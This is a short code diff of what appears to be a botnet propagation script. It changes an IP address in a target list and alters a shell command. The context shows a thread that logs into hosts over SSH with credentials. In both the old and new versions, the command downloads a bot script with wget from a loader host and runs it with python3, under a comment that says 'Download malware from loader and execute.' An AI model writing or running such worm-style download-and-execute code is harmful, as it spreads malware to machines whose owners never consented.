@@ -24,7 +24,7 @@ except:
     exit('MOD_ACTUAL_IP or OUR_DNS value is not supplied.')
 
 
-MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.253', '192.168.1.154', 
+MOD_IP_LIST = [MOD_ACTUAL_IP, '192.168.1.152', '192.168.1.153', '192.168.1.154', 
         '192.168.1.155', '192.168.1.156', '192.168.1.157', '192.168.1.158', 
         '192.168.1.159', '192.168.1.160', '192.168.1.161', '192.168.1.162'
         ] 
@@ -163,7 +163,7 @@ class ssh_login(Thread):
         try:
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
             # Download malware from loader and execute.
-            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry;python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry && python3 /tmp/bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
             sout.channel.recv_exit_status()
 
